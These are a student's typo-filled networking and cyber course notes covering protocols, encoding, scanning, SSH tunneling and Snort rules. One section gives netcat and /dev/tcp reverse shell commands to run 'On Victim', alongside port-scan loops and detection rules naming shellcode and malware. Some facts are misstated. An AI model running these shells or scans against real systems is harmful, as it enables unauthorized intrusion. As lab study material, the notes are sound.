https://net.cybbh.io/public/networking/latest/index.html
http://10.50.23.214:8000/    http://networking-ctfd-1.server.vta:8000/
osi model 7 layers = Application - SSH HTTTPS ect, Presentaton, Session - Connection, Transport - TCP & UDP, Network - How networks talk IPV4 IPV6 ICMP routing protocols, Data Link - Mac Address, Physical
PDU (Protocol Data Unit) Physical = Bit, Data Link = Frame, Network = Packet, Transport = Segment/Datagram, Session-Application = Data
iana is in charged of domain space and manages dns
ieee 
rfc (request for comment)
binary groupings are bit 1, nibble 4, byte 8, half word 16, word 32
base64 characters have a binary value associated to it a-z 0-9 + / = means known vakue
Topologies 
  Bus 
  Star all machines plugged into a center switch
  Ring Topology keeps going all mavhines connected in a ring
  Mesh is simaitar to star without a center swith there are partial mesh and full mesh where everybox is connected
  wireless is a topology with center being an ap 
  Hierarchial (used by most companies) access layer for users, distribution layer, core layer
Devices
  Hub put in info in one and broadcast info to all connected devices
  Repeater extands signal cable but degredation of quality may occur
  Switches can support different organizational units no ip needed uses mac addressing and can create vlans, creates cam table by reading source mac and adding it to its table and sends traffic to dest mac
  Routers have routing tables that is a collection of ipv4, ipv6 addresses
Ethernet Tming
  10 Mbps 100 ns
  100Mbps 10ns
  1 Gbps 1ns
  10 Gbps .1ns
  100 Gbps .01ns
Ethernet = 802.3(x) Wireless 802.11(x) Token Ring 802.5
Encapsulation and Decapsulation occurs with ip header
mac address is 48 bit | 6 B | 12 hex first 24 bits is oui anf last 24 is vendor specific, mac address do not transfer between routers
mac address type unicast 1 to 1 - 8th bit is off, multicast 1 to many 8th bit on, broadcast 1 to all all bits on
0x0800 = IPv4, 0x86DD = IPv6, 0x0806 = ARP, 0x8100 VLAN tag
for multiple vlan 0x88A8 ust be before 0x8100
Arp cache is dynamic and can last up to 20 mins and at minimum default gateway will be in arp cache
VLAN Trunking Protocol is proprietary to cisco
Dynamic Trunking Protocol cisco proprietary and is on by default
Cisco Discovery Protocol
Foundry Discovery Protocol
Link Layer Discovery Protocol
Spanning Tree Protocol 802.11D, Per VLAN Spanning TREE +, 802.1w Rapid Spanning Tree Protocol, Rapid Per VLAN Spanning Tree +, 802.1s Multiple Spanning Tree Protocol
Port Security modes are Shutdown(default), Protect, Restrict
BPDU(Bridge protocol Data Unit) is whats sent by bridge iot create root bridge used by dtp, vtp, stp, cdp, fdp to communicate

Offset value formula for fragmented packets (MTU-(IHL*4))/8
IHL are in length of words 32bits 
APIPA 169.254.0.0/16

types of vpn include remote access(client-to-site), site to site
ssh asymmetric or pki for key exchange, user key and host key are asymmetric while session key is symmetric
ssh known host database is in ~/.ssh/known_hosts
ssh config files /etc/ssh/ssh_config and /etc/ssh/sshd.config
HTTP 80 clear text no encryption
HTTPS 443 encrypted
both use user request mthods GET/HEAD/POST/PUT
DNS TCP/UDP 53 UDP is for queries and TCP is for zone transfer
  dns records are
  A - IPV$ record
  AAAA - IPV6 record
  MX - Mail Server record
  TXT - human readable text
  NS - Name Server record
  SOA - tart of Authority
DHCPV4
  DORA is the acronym
  Discorver (Broadcast)
  Offer(Unicast)
  Request(Broadcast)
  Acknowledge(Unicast)
DHCPv6
  SLAAC
  Solicit(Multicast)
  Advertise(Unicast)
  Request or Info Request(Multicast)
  Reply(Unicast)

Socket types include user space and kernel space
  user space ae stream socket (TCP) & datagram sockt (UDP)
  kernel space are raw sockets require elevated perms

Kernel space sockets you are attempting to modify the encapsulation of data
nc -lp # (tcp listening port) nc -lup # (udp listening port)
Encode text to hex
  echo "message" | xxd
Encode file to hex
  xxd file.txt file-encoded.txt
Decode filr from hex
  xxd -r file-encoded.tx file-decoded.txt
Python hex encoding
  import binascii
  message = b'Message'
  hidden_msg = binascii.hexlify(message)
Encode text to base64:
  echo "Message" | base64
Endode file to Base64:
  base64 file.txt > file-encoded.txt
Decode file from Base64:
  base64 -d file-encoded.txt > file-decoded.txt
Python Base64 Encoding
  import base64
  message = b'Message'
  hidden_msg = base64.b64encode(message)

Passsive external methods 
  osint and publicaly avail info

Active External
    Ping sweep
    for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
    
    Netcat - Horizontal Scanning
        Range of IPs for specific ports
        TCP
          for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
        UDP
          for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'
     
    Netcat - Vertical Scan   
        Range of ports on specific IP
        TCP
          nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'
        UDP
          nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'
    
    Netcat - Banner Grabbing
     Find what is running on a particular port
        nc [Target IP] [Target Port]
        nc 172.16.82.106 22
        nc -u 172.16.82.106 53
        -u : To switch to UDP
    
    Curl and WGET
     Both can be used to interact with the HTTP, HTTPS and FTP protocols.
      Curl - Displays ASCII
      curl http://172.16.82.106
      curl ftp://172.16.82.106
      curl 172.16.82.106:80
    Wget - Downloads (-r recursive)
      wget -r http://172.16.82.106
      wget -r ftp://172.16.82.106
      wget 172.16.82.106
      wget 172.16.82.106:80

Passive Internal
    IP Configuration
    Windows: ipconfig /all
    Linux: ip address (ifconfig depreciated)
    VyOS: show interface
    
    DNS Configuration
    Windows: ipconfig /displaydns
    Linux: cat /etc/resolv.conf
    
    Arp Cache
    Windows: arp -a
    Linux: ip neighbor (arp -a depreciated)
    
    Network Connection
      Windows: netstat
      Linux: ss (netstat depreciated)
      Example options useful for both netstat and ss: -antp
      a = Displays all active connections and ports.
      n = No determination of protocol names. Shows 22 not SSH.
      t = Display only TCP connections.
      u = Display only UDP connections.
      p = Shows which processes are using which sockets.
      l = listening ports
    
    Services File
      Windows: %SystemRoot%\system32\drivers\etc\services
      Linux/Unix: /etc/services
    
    OS Info
      Windows: systeminfo
      Linux: uname -a and /etc/os-release
    
    Running Process
      Windows: tasklist
      Linux: ps or top
      Example options useful for ps: -elf
      e = Show all running processes
      l = Show long format view
      f = Show full format listing
    
    Command Path commands
      which <command>
      whereis <command>
    
    Routing Table
      Windows: route print
      Linux: ip route (netstat -r deprecated)
      VyOS: show ip route
      
    File Search
      find / -name hint* 2> /dev/null
      find / -iname flag* 2> /dev/null
    
    SSH Config
      Windows: C:\Windows\System32\OpenSSH\sshd_config
      Linux: /etc/ssh/sshd_config

Active Internal
    Arp Scanning
      arp-scan --interface=eth0 --localnet
      nmap -sP -PR 172.16.82.96/27 -vvvv (for udp -sU)

    Ping Scanning
      ping -c 1 172.16.82.106
      for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
      sudo nmap -sP 172.16.82.96/27
    
    Dev Tcp Banner Grab
      exec 3<>/dev/tcp/172.16.82.106/22; echo -e "" >&3; cat <&3

    Dev Tcp Scanning
      for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done
    
Required info for network maps
  Network Forensics - Mapping    
      Device type (Router/host)
      System Host-names
      Interface names (eth0, eth1, etc)
      IP address and CIDRs for all interfaces
      TCP and UDP ports
      MAC Address
      OS type/version
      Known credentials

Reverse shell with nc and /dev/tcp
    First listen for the shell on your device.
    $ nc -lvp 9999
        On Victim using -c :
    $ nc -c /bin/bash 10.10.0.40 9999
        On Victim using -e :
    $ nc -e /bin/bash 10.10.0.40 9999
    
    First listen for the shell on your device.
    $ nc -lvp 9999
    On Victim:
    $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1

to view a commands being ran
  watch -n1 'command'

SSH Options
    -L - Creates a port on the client mapped to a ip:port via the server
        ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
        or
        ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT
        ssh <user>@<ip> -L <bindportmyport>:<tgt ip>:<tgt port>
        SSgt EX.) ssh user@bh1 -L 52200:127.0.0.1:80 -NT
        (in this example bh1 was used as a forwarder and tgt ip was a host on internal net)ssh user@bh1 -L <bindportmyport>:tgt ip:tgt port

    -D - Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically
        ssh user@bh1extip -D 9050 -NT
          nmap scans
            proxychains nmap -T4 -vvvv -p 21-23,80 <ip> -Pn
        ssh user@LO -p <port> -D 9050 -NT (dynamic port forward on a port forwarded host)

    -R - Creates the port on the server mapped to a ip:port via the client
        ssh user@bh1intip -R 52299(remote host opens this port):127.0.0.1(LO):80 -NT [PART 2] ssh user@bh1 -L 52202(bindportmyport):127.0.0.1(LO):52299(tgt port -R port) -NT  
 
    -NT - Do not execute a remote command and disable pseudo-tty (will hang window)

netstat command not found use ss -ntlp
when ssh using port forwarding use loopback add and bindportmyport of that ssh forward

FOR LOOPBACK COMPREHENSION
Key is geen is my nbox
ssh user@bh1 -L bindport:tgtip:tgtport bindport is green everything is purple and belongs to tgt (LO is the host after @)
ssh user@bh1 -R bindport:tgtip:tgtport only -R and tgt and tgt port is green rest is purple (LO is host in cli hostname)
scp with port forward
  scp -P <port> user@LO:<sourcefilepath> <destfilepath>

SNORT
      Common line switches
    
            -D - to run snort as a daemon
    
            -c - to specify a configuration file when running snort
    
            -l - specify a log directory
    
            -r - to have snort read a pcap file
    
     To run snort as a Daemon
    
        sudo snort -D -c /etc/snort/snort.conf -l /var/log/snort
    
     To run snort against a PCAP
    
        sudo snort -c /etc/snort/rules/file.rules -r file.pcap
    
    [action] [protocol] [s.ip] [s.port] [direction] [d.ip] [d.port] ( match conditions ;)
    * Action - alert, log, pass, drop, or reject
    * Protocol - TCP, UDP, ICMP, or IP
    * Source IP address - one IP, network, [IP range], or any
    * Source Port - one, [multiple], any, or [range of ports]
    * Direction - source to destination or both
    * Destination IP address - one IP, network, [IP range], or any
    * Destination port - one, [multiple], any, or [range of ports]
        Categories
    
            General
    
            Payload detection
    
            Non-Payload detection
    
            Post detection
    
            Thresholding and suppression
    Snort IDS/IPS rule - Header
    
    [action] [protocol] [s.ip] [s.port] [direction] [d.ip] [d.port] ( match conditions ;)
    
    * Action - alert, log, pass, drop, or reject
    * Protocol - TCP, UDP, ICMP, or IP
    * Source IP address - one IP, network, [IP range], or any
    * Source Port - one, [multiple], any, or [range of ports]
    * Direction - source to destination or both
    * Destination IP address - one IP, network, [IP range], or any
    * Destination port - one, [multiple], any, or [range of ports]
    
    Snort Rule Options
    
        Categories
    
            General
    
            Payload detection
    
            Non-Payload detection
    
            Post detection
    
            Thresholding and suppression
    
    Snort IDS/IPS General rule options:
    * msg:"text" - specifies the human-readable alert message
    * reference: - links to external source of the rule
    * sid: - used to uniquely identify Snort rules (required)
    * rev: - uniquely identify revisions of Snort rules
    * classtype: - used to describe what a successful attack would do
    * priority: - level of concern (1 - really bad, 2 - badish, 3 - informational)
    * metadata: - allows a rule writer to embed additional information about the rule
    PAYLOAD DETECTION 
    * content:"text" - looks for a string of text.
    * content:"|binary data|" - to look for a string of binary HEX
    * nocase - modified content, makes it case insensitive
    * depth: - specify how many bytes into a packet Snort should search for the
               specified pattern
    * offset: - skips a certain number of bytes before searching (i.e. offset: 12)
    * distance: - how far into a packet Snort should ignore before starting to
                  search for the specified pattern relative to the end of the
                  previous pattern match
    * within: - modifier that makes sure that at most N bytes are between pattern
                matches using the content keyword
    NON PAYLOAD DETECTION
    * flow: - direction (to/from client and server) and state of connection
             (established, stateless, stream/no stream)
    * ttl: - The ttl keyword is used to check the IP time-to-live value.
    * tos: - The tos keyword is used to check the IP TOS field for a specific value.
    * ipopts: - The ipopts keyword is used to check if a specific IP option is present
    * fragbits: - Check for R|D|M ip flags.
    * dsize: - Test the packet payload size
    * seq: - Check for a specific TCP sequence number
    * ack: - Check for a specific TCP acknowledge number.
    * flags: - Check for E|C|U|A|P|R|S|F|0 TCP flags.
    * itype: - The itype keyword is used to check for a specific ICMP type value.
    * icode: - The icode keyword is used to check for a specific ICMP code value.
    POST DETECTION
    * logto: - The logto keyword tells Snort to log all packets that trigger this rule to
               a special output log file.
    * session: - The session keyword is built to extract user data from TCP Sessions.
    * react: - This keyword implements an ability for users to react to traffic that
               matches a Snort rule by closing connection and sending a notice.
    * tag: - The tag keyword allow rules to log more than just the single packet that
             triggered the rule.
    * detection_filter - defines a rate which must be exceeded by a source or destination
                         host before a rule can generate an event
    THRESHOLDING AND SUPPRESSION
    threshold: type [limit | threshold | both], track [by_src | by_dst],
    count [#], seconds [seconds]
    
    * limit - alerts on the 1st event during defined period then ignores the rest.
    * threshold - alerts every [x] times during defined period.
    * both - alerts once per time internal after seeing [x] amount of occurrences
             of event. It then ignores all other events during period.
    * track - rate is tracked either by source IP address, or destination IP address
    * count - number of rule matching in [s] seconds that will cause event_filter
              limit to be exceeded
    * seconds - time period over which count is accrued. [s] must be nonzero value

SNORT RULES EXAMPLES
alert tcp any any -> any any (msg:"SYN FIN Scan"; flags: SF;sid:9000005;)
alert tcp any any -> any any (msg:"FIN Scan"; flags: F;sid:9000006;)
alert tcp any any -> any any (msg:"NULL Scan"; flags: 0;sid:9000007;)
alert tcp any any -> any any (msg:"XMAS Scan"; flags: FPU;sid:9000008;)
alert tcp any any -> any any (msg:"Full XMAS Scan"; flags: SRAFPU;sid:9000009;)
alert tcp any any -> any any (msg:"URG Scan"; flags: U;sid:9000010;)
alert tcp any any -> any any (msg:"URG FIN Scan"; flags: FU;sid:9000011;)
alert tcp any any -> any any (msg:"PUSH FIN Scan"; flags: FP;sid:9000012;)
alert tcp any any -> any any (msg:"URG PUSH Scan"; flags: PU;sid:9000013;)
alert ip any any -> any any ( msg:"INDICATOR-SHELLCODE x86"; content:"|90 90 90 90 90 90 90 90 90 90 90 90 90 90|",fast_pattern,nocase; metadata:policy max-detect-ips drop,ruleset community; sid:648; rev:18; )
alert tcp any any -> any 443 ( msg:"MALWARE-CNC Malicious BitCoiner Miner download - Win.Trojan.Minerd"; flow:to_server,established; content:"/minerd.exe",fast_pattern,nocase; http_raw_uri;  http_uri; metadata:impact_flag red,policy balanced-ips drop,policy security-ips drop,ruleset community; reference:url,www.virustotal.com/en/file/583b585078f37f5d399a228f1b8021ca0a9e904a55792281048bae9cfe0e95c1/analysis/; sid:30551; rev:2; )
alert tcp any any -> any 443 ( msg:"MALWARE-CNC Malicious BitCoiner Miner download - Win.Trojan.Systema"; flow:to_server,established; content:"/aviatic/systema.exe",fast_pattern,nocase; http_raw_uri; http_uri; metadata:impact_flag red,policy balanced-ips drop,policy security-ips drop,ruleset community; reference:url,www.virustotal.com/en/file/583b585078f37f5d399a228f1b8021ca0a9e904a55792281048bae9cfe0e95c1/analysis/; reference:url,www.virustotal.com/en/file/e8bd297b1f59b7ea11db7d90e81002469a8f054f79638a57332ac448d819fb5d/analysis/; sid:30552; rev:2; )
alert ip any any -> any any ( msg:"INDICATOR-SHELLCODE"; content:"|90 90 90 E8 C0 FF FF FF|/bin/sh",fast_pattern,nocase; metadata:ruleset community; sid:652; rev:15; )
alert icmp any any -> any any (msg:ICMP detected; sid:111; rev:1;)
#alert tcp any any -> any 22 ( msg:"SSH attempt detected"; sid:9000015;)
alert tcp any any -> any 53 ( msg:"PROTOCOL-DNS dns zone transfer via TCP detected"; flow:to_server,established; content:"|00 01 00 00 00 00 00|",depth 8,offset 6; byte_test:1,!&,0xF8,4; content:"|00 00 FC 00 01|",fast_pattern; isdataat:!1,relative; metadata:ruleset community; reference:cve,1999-0532; reference:nessus,10595; sid:255; rev:23; )
alert udp any any -> 10.0.0.0/8 [137,138] (msg:"ransomware";sid:1000006;)
alert tcp any any -> 10.0.0.0/8 139 (msg:"ransomware";sid:1000007;)
alert tcp any any -> 10.0.0.0/8 445 (msg:"ransomware";sid:1000008;)
alert icmp any any -> any any (msg:"Cows";content:"|DEADBEEF|";sid:1000001;)
alert icmp any any -> 10.3.0.0/24 any (msg:"DMZ Ping";itype:8;icode:0;sid:1000002;)
alert icmp any any -> any any (msg:ICMP detected; sid:111; rev:1;)
alert ip any any -> 192.168.65.20 3389 (msg:"RDP";sid:1000004;)
alert tcp any any -> any 22 (msg:"ssh 3 strikes";threshold:type both,track by_src,count 3,seconds 10;sid:1000003;)

















